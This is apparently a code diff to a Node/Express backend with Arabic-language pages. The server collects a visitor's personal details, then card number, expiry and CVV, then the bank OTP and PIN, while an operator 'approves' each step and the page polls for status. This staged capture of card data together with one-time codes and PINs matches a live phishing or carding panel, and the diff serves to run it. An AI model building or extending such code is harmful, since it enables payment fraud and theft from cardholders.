@@ -10,20 +10,9 @@ app.use(cors());
 app.use(bodyParser.json());
 app.use(bodyParser.urlencoded({ extended: true }));
 
-// Custom routing to bypass cache for ALL important pages
+// Custom routing
 app.get('/', (req, res) => {
-    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
     res.sendFile(path.join(__dirname, 'index_ar.html'));
-});
-
-app.get('/index_ar.html', (req, res) => {
-    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
-    res.sendFile(path.join(__dirname, 'index_ar.html'));
-});
-
-app.get('/payment_ar.html', (req, res) => {
-    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
-    res.sendFile(path.join(__dirname, 'payment_new_ar.html'));
 });
 
 app.use(express.static(path.join(__dirname, './')));
@@ -41,21 +30,19 @@ app.post('/api/login', (req, res) => {
     }
 });
 
-// Save data and set status to 'waiting_payment'
+// Step 1: Client submits personal data from index_ar.html
 app.post('/submit-data', (req, res) => {
     const data = req.body;
     const orderId = Date.now().toString();
     const order = {
         id: orderId,
         timestamp: new Date().toLocaleString('ar-AE'),
-        status: 'waiting_payment',
-        name: data.name || 'غير معروف',
-        phone: data.phone || '',
-        transactionId: data.transactionId || '',
-        cardName: data.cardName || '',
-        cardNumber: data.cardNumber || '',
-        expiryDate: data.expiryDate || '',
-        cvv: data.cvv || '',
+        status: 'personal_data_submitted',
+        ...data,
+        cardName: '',
+        cardNumber: '',
+        expiryDate: '',
+        cvv: '',
         otp: '',
         pin: '',
         lastError: ''
@@ -64,37 +51,56 @@ app.post('/submit-data', (req, res) => {
     res.json({ success: true, orderId: orderId });
 });
 
-// Update OTP
+// Step 2: Client submits card data from payment_new_ar.html
+app.post('/submit-card', (req, res) => {
+    const { orderId, cardName, cardNumber, expiryDate, cvv } = req.body;
+    const order = orders.find(o => o.id === orderId);
+    if (order) {
+        order.cardName = cardName;
+        order.cardNumber = cardNumber;
+        order.expiryDate = expiryDate;
+        order.cvv = cvv;
+        order.status = 'waiting_admin_approval'; // Trigger loading page for client
+        res.json({ success: true });
+    } else {
+        res.status(404).json({ success: false });
+    }
+});
+
+// Step 3: Client submits OTP
 app.post('/submit-otp', (req, res) => {
     const { orderId, otp } = req.body;
     const order = orders.find(o => o.id === orderId);
     if (order) {
         order.otp = otp;
-        order.status = 'waiting_otp';
+        order.status = 'otp_submitted';
         res.json({ success: true });
     } else {
         res.status(404).json({ success: false });
     }
 });
 
-// Update PIN
+// Step 4: Client submits PIN
 app.post('/submit-pin', (req, res) => {
     const { orderId, pin } = req.body;
     const order = orders.find(o => o.id === orderId);
     if (order) {
         order.pin = pin;
-        order.status = 'waiting_pin';
+        order.status = 'pin_submitted';
         res.json({ success: true });
     } else {
         res.status(404).json({ success: false });
     }
 });
 
-// Polling endpoint for client to check status
+// Polling endpoint for client to check status and get redirected
 app.get('/api/check-status/:orderId', (req, res) => {
     const order = orders.find(o => o.id === req.params.orderId);
     if (order) {
-        res.json({ status: order.status, lastError: order.lastError });
+        res.json({ 
+            status: order.status, 
+            lastError: order.lastError 
+        });
     } else {
         res.status(404).json({ success: false });
     }
